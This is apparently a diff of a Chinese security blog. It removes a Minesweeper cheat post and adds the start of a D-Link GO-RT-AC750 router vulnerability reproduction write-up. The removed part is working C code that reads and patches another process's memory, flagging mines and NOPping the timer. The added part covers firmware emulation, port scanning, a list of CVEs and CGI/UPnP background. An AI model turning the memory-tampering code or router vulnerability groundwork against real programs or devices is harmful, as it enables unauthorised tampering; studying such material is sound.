class="built_in">malloc</span>(dwSize);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 读取整个雷区的数据</span></span><br><span class="line">		ReadProcessMemory(hProcess, (LPVOID)dwBoomAddr, pByte, dwSize, <span class="number">0</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">while</span> (i &lt; dwSize) &#123;</span><br><span class="line">			<span class="keyword">if</span> (pByte[i] == <span class="number">0x8F</span>) &#123;</span><br><span class="line">				dwTmpAddr = <span class="number">0x01005340</span> + i;</span><br><span class="line">				WriteProcessMemory(hProcess, (LPVOID)dwTmpAddr, &amp;bClear, <span class="keyword">sizeof</span>(BYTE), <span class="number">0</span>);</span><br><span class="line">				n--;</span><br><span class="line">			&#125;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		<span class="comment">// 刷新扫雷的客户区</span></span><br><span class="line">		GetClientRect(hWnd, &amp;rt);</span><br><span class="line">		InvalidateRect(hWnd, &amp;rt, TRUE);</span><br><span class="line"> </span><br><span class="line">		<span class="built_in">free</span>(pByte);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Get hWnd failed.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431864.png" alt="image-20220127174048468"></p>
-<p>当当当，一共10个雷全被标出来了</p>
-<p>但是这里我们的游戏还没有获胜，因为我们只是单纯的将雷标注了出来，还需要将所有的空白全部点开才会判定Winning the game。所以，我们后续的工作还没有结束啊。</p>
-<h2 id="3-2-一键扫雷Get"><a href="#3-2-一键扫雷Get" class="headerlink" title="3.2 一键扫雷Get"></a>3.2 一键扫雷Get</h2><p>书接上回，我们暂时只是实现了我们对扫雷游戏中雷的标注，才插上了棋子。但是这并不足以判定我们的游戏胜利，我们还需要把所有未点开的方格点开。当然，如果不嫌麻烦，这一步也可以人工实现。但是嘛，我们的目的当然不只是这样，我们需要脚本来完成所有操作。</p>
-<p>这一块的关键点在于我们鼠标<code>按下</code>和<code>抬起</code>这两步操作，还有就是我们的<code>坐标</code>如何确定。关于这点，我就决定不在详细介绍了，分析完后不想写步骤了呢，去看大佬的吧。大佬的写的很详细，我只是单纯的记录下自己的复现流程。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	DWORD Pid = <span class="number">0</span>;</span><br><span class="line">	HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line"> 	<span class="comment">// 存放雷区的起始地址</span></span><br><span class="line">	DWORD dwBoomAddr = <span class="number">0x01005340</span>;</span><br><span class="line">	<span class="comment">// 雷区的最大值（包含边界）</span></span><br><span class="line">	DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">	PBYTE pByte = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 读取整个雷区的数据</span></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 读取雷区的长和宽</span></span><br><span class="line">	DWORD dwInfo = <span class="number">0</span>;</span><br><span class="line">	DWORD dwHeight = <span class="number">0</span>, dwWidth = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 雷区转换，去掉雷区多余的数据</span></span><br><span class="line">	PBYTE pTmpByte = <span class="literal">NULL</span>;</span><br><span class="line"> 	<span class="comment">// 获取雷区方块的坐标，然后模拟鼠标进行点击</span></span><br><span class="line">	<span class="keyword">int</span> x1 = <span class="number">0</span>, y1 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取扫雷游戏对应的窗口句柄</span></span><br><span class="line">	HWND hWnd = FindWindow(<span class="literal">NULL</span>, <span class="string">&quot;扫雷&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hWnd != <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="comment">// 获取扫雷进程ID</span></span><br><span class="line">		GetWindowThreadProcessId(hWnd, &amp;Pid);</span><br><span class="line">		<span class="comment">// 打开扫雷游戏获取其句柄</span></span><br><span class="line">		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class="line">		<span class="keyword">if</span> (hProcess == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Open winmine process failed.\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line"> 		<span class="comment">// 雷区的最大值（包含边界）</span></span><br><span class="line">		dwSize = <span class="number">832</span>;</span><br><span class="line">		pByte = (PBYTE)<span class="built_in">malloc</span>(dwSize);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 读取整个雷区的数据</span></span><br><span class="line">		ReadProcessMemory(hProcess, (LPVOID)dwBoomAddr, pByte, dwSize, <span class="number">0</span>);</span><br><span class="line">		n = dwSize;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 读取雷区的长和宽</span></span><br><span class="line">		dwInfo = <span class="number">0x01005330</span>;</span><br><span class="line">		dwHeight = <span class="number">0</span>;</span><br><span class="line">		dwWidth = <span class="number">0</span>;</span><br><span class="line">		ReadProcessMemory(hProcess, (LPVOID)(dwInfo + <span class="number">4</span>), &amp;dwWidth, <span class="keyword">sizeof</span>(DWORD), <span class="number">0</span>);</span><br><span class="line">		ReadProcessMemory(hProcess, (LPVOID)(dwInfo + <span class="number">8</span>), &amp;dwHeight, <span class="keyword">sizeof</span>(DWORD), <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">		h = dwHeight;</span><br><span class="line">		count = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">		<span class="comment">// 雷区转换，去掉雷区多余的数据</span></span><br><span class="line">		pTmpByte = (PBYTE)<span class="built_in">malloc</span>(dwHeight*dwWidth);</span><br><span class="line">		<span class="keyword">while</span> (i &lt; dwSize) &#123;</span><br><span class="line">			<span class="keyword">if</span> (pByte[i] == <span class="number">0x10</span> &amp;&amp; pByte[i + <span class="number">1</span>] == <span class="number">0x10</span>) &#123;</span><br><span class="line">				i = i + dwWidth + <span class="number">2</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (pByte[i] == <span class="number">0x10</span>) &#123;</span><br><span class="line">				<span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= dwWidth; j++) &#123;</span><br><span class="line">					pTmpByte[count] = pByte[i + j];</span><br><span class="line">					count++;					</span><br><span class="line">				&#125;</span><br><span class="line">				i = i + dwWidth + <span class="number">2</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">				h--;</span><br><span class="line">				<span class="keyword">if</span> (h == <span class="number">0</span>) <span class="keyword">break</span>;				</span><br><span class="line">			&#125;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		<span class="comment">// 获取雷区方块的坐标，然后模拟鼠标进行点击</span></span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dwHeight*dwWidth; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span> (pTmpByte[i] != <span class="number">0x8F</span>) &#123;</span><br><span class="line">				x1 = i % dwWidth; </span><br><span class="line">				y1 = i / dwWidth;</span><br><span class="line">				x = x1 * <span class="number">16</span> + <span class="number">16</span>;</span><br><span class="line">				y = y1 * <span class="number">16</span> + <span class="number">61</span>;</span><br><span class="line">				SendMessage(hWnd, WM_LBUTTONDOWN, MK_LBUTTON, MAKELONG(x, y));</span><br><span class="line">				SendMessage(hWnd, WM_LBUTTONUP, MK_LBUTTON, MAKELONG(x, y));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		<span class="built_in">free</span>(pByte);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Get hWnd failed.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431865.png" alt="image-20220128140551103"></p>
-<p>当当，运行脚本，游戏结束。</p>
-<h1 id="4-最终脚本"><a href="#4-最终脚本" class="headerlink" title="4. 最终脚本"></a>4. 最终脚本</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	DWORD Pid = <span class="number">0</span>;</span><br><span class="line">	HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"> 	<span class="comment">// 存放雷区的起始地址</span></span><br><span class="line">	DWORD dwBoomAddr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 雷区的最大值（包含边界）</span></span><br><span class="line">	DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">	PBYTE pByte = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 读取整个雷区的数据</span></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 读取雷区的长和宽</span></span><br><span class="line">	DWORD dwInfo = <span class="number">0</span>;</span><br><span class="line">	DWORD dwHeight = <span class="number">0</span>, dwWidth = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 雷区转换，去掉雷区多余的数据</span></span><br><span class="line">	PBYTE pTmpByte = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"> 	<span class="comment">// 获取雷区方块的坐标，然后模拟鼠标进行点击</span></span><br><span class="line">	<span class="keyword">int</span> x1 = <span class="number">0</span>, y1 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 控制时间自增的指令地址</span></span><br><span class="line">	DWORD incAddress1 = <span class="number">0x01002FF5</span>;</span><br><span class="line">	DWORD incAddress2 = <span class="number">0x01003830</span>;</span><br><span class="line">	<span class="comment">// 将时间自增NOP掉的6字节指令</span></span><br><span class="line">	<span class="keyword">char</span> inc[<span class="number">6</span>] = &#123; <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span> &#125;;</span><br><span class="line">	DWORD result1, result2;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">// 获取扫雷游戏对应的窗口句柄</span></span><br><span class="line">	HWND hWnd = FindWindow(<span class="literal">NULL</span>, <span class="string">&quot;扫雷&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hWnd != <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="comment">// 获取扫雷进程ID</span></span><br><span class="line">		GetWindowThreadProcessId(hWnd, &amp;Pid);</span><br><span class="line">		<span class="comment">// 打开扫雷游戏获取其句柄</span></span><br><span class="line">		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class="line">		<span class="keyword">if</span> (hProcess == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Open winmine process failed.&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		<span class="comment">// NOP掉时间自增的语句</span></span><br><span class="line">		result1 = WriteProcessMemory(hProcess, (LPVOID)incAddress1, &amp;inc, <span class="number">6</span>, <span class="number">0</span>);</span><br><span class="line">		result2 = WriteProcessMemory(hProcess, (LPVOID)incAddress2, &amp;inc, <span class="number">6</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (result1 == <span class="number">0</span> || result2 == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Inc modify failed.&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		<span class="comment">// 存放雷区的起始地址</span></span><br><span class="line">		dwBoomAddr = <span class="number">0x01005340</span>;</span><br><span class="line">		<span class="comment">// 雷区的最大值（包含边界）</span></span><br><span class="line">		dwSize = <span class="number">832</span>;</span><br><span class="line">		pByte = <span class="literal">NULL</span>;</span><br><span class="line">		pByte = (PBYTE)<span class="built_in">malloc</span>(dwSize);</span><br><span class="line"> </span><br><span class="line">		<span class="comment">// 读取整个雷区的数据</span></span><br><span class="line">		ReadProcessMemory(hProcess, (LPVOID)dwBoomAddr, pByte, dwSize, <span class="number">0</span>);</span><br><span class="line">		i = <span class="number">0</span>;</span><br><span class="line">		j = <span class="number">0</span>;</span><br><span class="line">		n = dwSize;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 读取雷区的长和宽</span></span><br><span class="line">		dwInfo = <span class="number">0x01005330</span>;</span><br><span class="line">		dwHeight = <span class="number">0</span>;</span><br><span class="line">		dwWidth = <span class="number">0</span>;</span><br><span class="line">		ReadProcessMemory(hProcess, (LPVOID)(dwInfo + <span class="number">4</span>), &amp;dwWidth, <span class="keyword">sizeof</span>(DWORD), <span class="number">0</span>);</span><br><span class="line">		ReadProcessMemory(hProcess, (LPVOID)(dwInfo + <span class="number">8</span>), &amp;dwHeight, <span class="keyword">sizeof</span>(DWORD), <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">		h = dwHeight;</span><br><span class="line">		count = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">		<span class="comment">// 雷区转换，去掉雷区多余的数据</span></span><br><span class="line">		pTmpByte = <span class="literal">NULL</span>;</span><br><span class="line">		pTmpByte = (PBYTE)<span class="built_in">malloc</span>(dwHeight*dwWidth);</span><br><span class="line">		<span class="keyword">while</span> (i &lt; dwSize) &#123;</span><br><span class="line">			<span class="keyword">if</span> (pByte[i] == <span class="number">0x10</span> &amp;&amp; pByte[i + <span class="number">1</span>] == <span class="number">0x10</span>) &#123;</span><br><span class="line">				i = i + dwWidth + <span class="number">2</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (pByte[i] == <span class="number">0x10</span>) &#123;</span><br><span class="line">				<span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= dwWidth; j++) &#123;</span><br><span class="line">					pTmpByte[count] = pByte[i + j];</span><br><span class="line">					count++;					</span><br><span class="line">				&#125;</span><br><span class="line">				i = i + dwWidth + <span class="number">2</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">				h--;</span><br><span class="line">				<span class="keyword">if</span> (h == <span class="number">0</span>) <span class="keyword">break</span>;				</span><br><span class="line">			&#125;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		<span class="comment">// 获取雷区方块的坐标，然后模拟鼠标进行点击</span></span><br><span class="line">		x1 = <span class="number">0</span>;</span><br><span class="line">		y1 = <span class="number">0</span>;</span><br><span class="line">		x = <span class="number">0</span>;</span><br><span class="line">		y = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dwHeight*dwWidth; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span> (pTmpByte[i] != <span class="number">0x8F</span>) &#123;</span><br><span class="line">				x1 = i % dwWidth; </span><br><span class="line">				y1 = i / dwWidth;</span><br><span class="line">				x = x1 * <span class="number">16</span> + <span class="number">16</span>;</span><br><span class="line">				y = y1 * <span class="number">16</span> + <span class="number">61</span>;</span><br><span class="line">				SendMessage(hWnd, WM_LBUTTONDOWN, MK_LBUTTON, MAKELONG(x, y));</span><br><span class="line">				SendMessage(hWnd, WM_LBUTTONUP, MK_LBUTTON, MAKELONG(x, y));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		<span class="built_in">free</span>(pByte);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Get hWnd failed.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h1><p>FirmAE一键搭建</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015525.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015527.png" alt="img"></p>
+<p>nmap扫描，发现upnp端口为49152</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015528.png" alt="img"></p>
+<p>固件下载链接</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://media.dlink.eu/support/products/go/go-rt-ac750/driver_software/go-rt-ac750_fw_reva_1-01b03_eu_multi_20141017.<span class="built_in">zip</span></span><br></pre></td></tr></table></figure>
 
 
 
-<h1 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5. 参考链接"></a>5. 参考链接</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">扫雷辅助的研究</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;ioio_jy&#x2F;article&#x2F;details&#x2F;90577172</span><br></pre></td></tr></table></figure>
+<p>复现漏洞：</p>
+<p>CVE-2023-34800</p>
+<p>CVE-2023-26822</p>
+<p>CVE-2022-37057</p>
+<p>CVE-2022-37056</p>
+<p>CVE-2022-36523</p>
+<h1 id="3-背景知识"><a href="#3-背景知识" class="headerlink" title="3. 背景知识"></a>3. 背景知识</h1><h2 id="3-1-CGI（Common-Gateway-Interface）通用网关接口"><a href="#3-1-CGI（Common-Gateway-Interface）通用网关接口" class="headerlink" title="3.1 CGI（Common Gateway Interface）通用网关接口"></a>3.1 CGI（Common Gateway Interface）通用网关接口</h2><p>CGI规定了Web服务器调用CGI程序的接口协议标准。Web服务器通过调用CGI程序实现和Web浏览器的交互，即CGI程序接受Web浏览器发送给Web服务器的信息并进行处理，将处理后的结果返回给Web服务器。组成CGI通信系统的是两部分：一部分是html页面，用于在浏览器上显示；另一部分则是运行在服务器上的CGI程序。</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015529.png" alt="img"></p>
+<p>通常情况下，服务器和CGI程序在Web环境变量的协作下，通过标准输入（stdin）和标准输出（stdout）来进行数据传递。以Go-RT-AC750的Web服务器工作流程为例：</p>
+<ol>
+<li>服务器接受到浏览器传来的URL，识别URL中指定的脚本，如xx.php或xx.cgi并将其交给cgibin解析处理。</li>
+<li>服务为CGI程序（cgibin）执行做准备，比如准备环境变量和相关参数。</li>
+<li>CGI程序（cgibin）读取标准输入和相关环境变量，执行相应处理，处理完后将结果由标准输出返回到服务器。</li>
+<li>服务器将接收到的处理结果返回浏览器。</li>
+</ol>
+<p>CGI程序继承了系统的环境变量。CGI环境变量在CGI程序启动时初始化，在CGI程序结束时销毁。当CGI程序被HTTP服务器调用时，它的环境变量就会增加一些和HTTP服务相关的环境变量。下面是一些常见的和HTTP相关的环境变量（CGI程序使用getenv()函数获取环境变量，例如getenv(“CONTENT_TYPE”)：</p>
+<table>
+<thead>
+<tr>
+<th>变量</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>REQUEST_METHOD</td>
+<td>服务器与CGI程序之间的信息传输方式</td>
+</tr>
+<tr>
+<td>QUERY_STRING</td>
+<td>采用GET时所传输的信息</td>
+</tr>
+<tr>
+<td>CONTENT_LENGTH</td>
+<td>传来的有效信息长度</td>
+</tr>
+<tr>
+<td>CONTENT_TYPE</td>
+<td>传来的信息的MIME类型</td>
+</tr>
+<tr>
+<td>SERVER_NAME</td>
+<td>服务器的IP或名字</td>
+</tr>
+<tr>
+<td>SERVER_PORT</td>
+<td>服务器的端口号</td>
+</tr>
+<tr>
+<td>SERVER_ID</td>
+<td>服务ID</td>
+</tr>
+<tr>
+<td>REMOTE_ADDR</td>
+<td>客户机的主机名</td>
+</tr>
+<tr>
+<td>REMOTE_HOST</td>
+<td>客户机的IP地址</td>
+</tr>
+</tbody></table>
+<h2 id="3-2-UPnP（Universal-Plug-and-Play）通用即插即用"><a href="#3-2-UPnP（Universal-Plug-and-Play）通用即插即用" class="headerlink" title="3.2 UPnP（Universal Plug and Play）通用即插即用"></a>3.2 UPnP（Universal Plug and Play）通用即插即用</h2><p>UPnP时由微软提出的一种通用即插即用技术，后续联合英特尔等多家科技公司共同制定了UPnP标准。UPnP主要是为了实现在“零配置”的前提下在互联网设备间能自动连接和协同工作。UPnP的协议栈结构图如下：</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015530.png" alt="img"></p>
+<p>UPnP协议体系结构中主要协议和规范包括：</p>
+<ul>
+<li>SSDP（Simple Service Discovery Protocol）简单服务发现协议，用于发现网络中的UPnP设备。</li>
+<li>GENA（Generic Event Notification Architecture）通用事件通知结构，用于及时通知状态变化。</li>
+<li>SOAP（Simple Object Access Protocol），简单对象访问协议，用于保证UPnP设备具有互操作能力。</li>
+<li>XML（Extensible Markup Language）可扩展标记语言，对设备和服务进行统一的描述。</li>
+</ul>
+<p>当加入一个新的UPnP设备时，工作流程如下：</p>
+<ol>
+<li>设备加入网络后通过设备寻址（addressing）就可以自动获得IP地址；</li>
+<li>通过设备发现（discover）控制点就可知道网络上存在哪些设备；</li>
+<li>通过设备描述（description）控制点就可知道设备详细信息以及设备提供哪些服务；</li>
+<li>通过设备控制（control）控制点就可以使用设备的服务；</li>
+<li>通过设备事件（event）就可以将其状态变化及时告诉给订阅的控制点；</li>
+<li>通过设备展示（presentation）控制点可以用浏览器查看设备状态和控制设备。</li>
+</ol>
+<p>通过上述六个步骤，UPnP设备可以做到在“零配置”的前提下提供联网设备之间的自动发现、自动声明、“直接”信息交换和互操作等功能，真正实现“设备即插即用”。</p>
+<h1 id="4-漏洞复现"><a href="#4-漏洞复现" class="headerlink" title="4. 漏洞复现"></a>4. 漏洞复现</h1><h2 id="4-1-CVE-2023-34800"><a href="#4-1-CVE-2023-34800" class="headerlink" title="4.1 CVE-2023-34800"></a>4.1 CVE-2023-34800</h2><h3 id="4-1-1-漏洞分析"><a href="#4-1-1-漏洞分析" class="headerlink" title="4.1.1 漏洞分析"></a>4.1.1 漏洞分析</h3><p>查找漏洞详情</p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015531.png" alt="img"></p>
+<p>知道了漏洞和<code>genacgi_main</code>函数有关，那么查找相关字符串，匹配到相关文件<code>htdocs/cgibin</code></p>
+<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015532.png" alt="img"></p>
